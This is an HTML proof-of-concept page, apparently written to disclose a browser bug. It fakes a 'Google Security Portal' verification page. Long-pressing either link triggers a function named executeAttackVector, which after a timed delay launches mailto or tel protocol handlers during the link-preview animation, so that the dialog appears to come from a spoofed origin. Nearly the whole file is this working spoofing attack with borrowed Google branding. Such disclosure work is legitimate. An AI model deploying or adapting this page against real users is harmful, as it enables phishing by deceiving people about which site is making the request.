<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Picker Origin Spoof PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            width: 100%;
            max-width: 320px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 28px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .preview-container {
            margin-top: 25px;
            max-width: 280px;
            display: none;
        }
        .preview-container img {
            width: 100%;
            border-radius: 8px;
            border: 1px solid #dadce0;
            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
        }
        .file-info {
            margin-top: 10px;
            font-size: 13px;
            color: #5f6368;
            word-break: break-all;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>Secure Document Verification</h1>

    <!-- Container dengan 2 Tombol Terpisah -->
    <div class="button-container">
        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-type="mailto">Open Window & Send Email Google</a>
        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-type="tel">Open Window & Call Support GOOGLE</a>
    </div>

    <!-- Uploaded Image Preview Box -->
    <div class="preview-container" id="previewBox">
        <img id="imagePreview" src="" alt="File Preview">
        <div class="file-info" id="fileInfo"></div>
    </div>

    <div class="footer-note">Cloud-secured verification system.</div>

    <script>
        let triggered = false;

        const executeAttackVector = (actionType) => {
            if (triggered) return;
            triggered = true;

            // Timer optimized to match the preview page opening animation
            setTimeout(async () => {
                try {
                    if (actionType === 'mailto') {
                        window.location.href = "mailto:support@google.com?subject=Verification%20Support&body=Please%20verify%20my%20account.";
                        document.getElementById("fileInfo").innerText = "Triggered mailto protocol handler.";
                    } else {
                        window.location.href = "tel:+18005550199";
                        document.getElementById("fileInfo").innerText = "Triggered tel protocol handler.";
                    }

                    const previewBox = document.getElementById("previewBox");
                    imagePreview.src = "";
                    previewBox.style.display = "block";

                } catch (err) {
                    console.debug("Handler cancelled or blocked:", err.message);
                } finally {
                    setTimeout(() => { triggered = false; }, 900);
                }
            }, 1900); // 1.7 seconds delay for ephemeral tab
        };

        // Event listener untuk Tombol Mailto
        const linkMailto = document.getElementById("targetLinkMailto");
        linkMailto.addEventListener("contextmenu", (e) => {
            executeAttackVector('mailto');
        });
        linkMailto.addEventListener("touchstart", () => {}, { passive: true });

        // Event listener untuk Tombol Tel
        const linkTel = document.getElementById("targetLinkTel");
        linkTel.addEventListener("contextmenu", (e) => {
            executeAttackVector('tel');
        });
        linkTel.addEventListener("touchstart", () => {}, { passive: true });
    </script>

</body>
</html>
